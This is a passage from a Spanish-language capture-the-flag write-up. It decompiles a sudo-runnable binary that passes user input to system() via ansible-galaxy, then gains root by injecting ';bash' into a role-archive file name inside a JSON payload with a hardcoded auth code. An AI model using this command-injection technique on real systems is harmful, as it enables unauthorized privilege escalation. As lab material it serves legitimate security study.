</span></span><span class=line><span class=cl>  <span class=n>local_10</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>snprintf</span><span class=p>(</span><span class=n>local_418</span><span class=p>,</span><span class=mh>0x400</span><span class=p>,</span><span class=s>&#34;%s -i %s %s%s&#34;</span><span class=p>,</span><span class=s>&#34;/usr/bin/ansible-playbook&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;/opt/playbooks/inventory.ini&#34;</span><span class=p>,</span><span class=s>&#34;/opt/playbooks/&#34;</span><span class=p>,</span><span class=n>param_1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>system</span><span class=p>(</span><span class=n>local_418</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>local_10</span> <span class=o>!=</span> <span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=cm>/* WARNING: Subroutine does not return */</span>
</span></span><span class=line><span class=cl>    <span class=nf>__stack_chk_fail</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>De manera que este script est√° usando <code>Ansible Galaxy</code>, busca un archivo <code>.ini</code> llamado <code>/opt/playbooks/inventory.ini</code> y busca por un playbook llamado <code>/opt/playbooks/&lt;user-parameter></code>. <em>Luego, esta instrucci√≥n es ejecutada por <code>system</code></em>, de manera que podr√≠amos tratar de inyectar comando en el nombre del archivo comprimido.</p><p>En resumen:</p><ul><li>Necesitamos crear un archivo <code>JSON</code> el cual contenga un payload malicioso.</li><li>Este archivo necesita una llave/par√°metro <code>run</code> y otra llave/par√°metro <code>auth_code</code>.</li><li>La llave <code>auth_code</code> debe de tener el mismo valor que la key hallada en el binario anterior (<code>UHI75GHINKOP</code>).</li><li>Dentro de la key <code>run</code> necesitamos otra llave/par√°metro <code>action</code> (la cual necesita ser seteada como <code>install</code>) y una llave/par√°metro <code>role_file</code> para un archivo de <code>Ansible</code> comprimido para roles (para m√°s detalles, ver <a href=https://www.pluralsight.com/resources/blog/cloud/ansible-roles-explained class=external-link target=_blank rel=noopener>este blog</a>).</li><li>Dado que este archivo comprimido de roles para <code>Ansible</code> est√° siendo ejecutado por <code>system</code>, podemos tratar de inyectar comando en el nombre del archivo comprimido.</li></ul><p>Ahora que sabemos todos los campos requeridos, podemos tratar de crear nuestro archivo <code>JSON</code> malicioso. Adem√°s, necesitaremos un archivo <code>tar</code> conteniendo roles. Buscando encuentro <a href=https://github.com/coopdevs/sys-admins-role/releases class=external-link target=_blank rel=noopener>este repositorio de Github para roles de <code>Ansible</code></a> para crear un rol <code>sys admin</code>. Primero, descargamos el archivo comprimido con los roles para <code>Ansible</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ wget https://github.com/coopdevs/sys-admins-role/archive/refs/tags/v0.0.3.tar.gz -O sys_admins_role.tar.gz
</span></span></span></code></pre></div><p>y pasamos esta archivo a la m√°quina v√≠ctima.</p><p>Ahora, renombramos el archivo de roles <code>.tar</code>. Para inyectar comandos (spawnear una shell), llamar√© este archivo como<code>payload.tar.gz;bash</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>lopez@intuition:/tmp$ cp sys_admins_role.tar.gz payload.tar.gz\;bash
</span></span></span></code></pre></div><p>y creamos un archivo <code>payload.json</code> con el contenido:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;run&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;action&#34;</span><span class=p>:</span><span class=s2>&#34;install&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;role_file&#34;</span><span class=p>:</span><span class=s2>&#34;payload.tar.gz;bash&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;auth_code&#34;</span><span class=p>:</span><span class=s2>&#34;UHI75GHINKOP&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Ahora, corro el comando con <code>sudo</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>lopez@intuition:/tmp$ sudo /opt/runner2/runner2 /tmp/payload.json
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting galaxy role install process
</span></span></span><span class=line><span class=cl><span class=go>[WARNING]: - payload.tar.gz was NOT installed successfully: Unknown error when attempting to call Galaxy at &#39;https://galaxy.ansible.com/api/&#39;: &lt;urlopen error [Errno -3]
</span></span></span><span class=line><span class=cl><span class=go>Temporary failure in name resolution&gt;
</span></span></span><span class=line><span class=cl><span class=go>ERROR! - you can use --ignore-errors to skip failed roles and finish processing the list.
</span></span></span><span class=line><span class=cl><span class=go>root@intuition:/tmp# whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>root
</span></span></span></code></pre></div><p>Funcion√≥. GG.</p><p>~Happy Hacking.</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>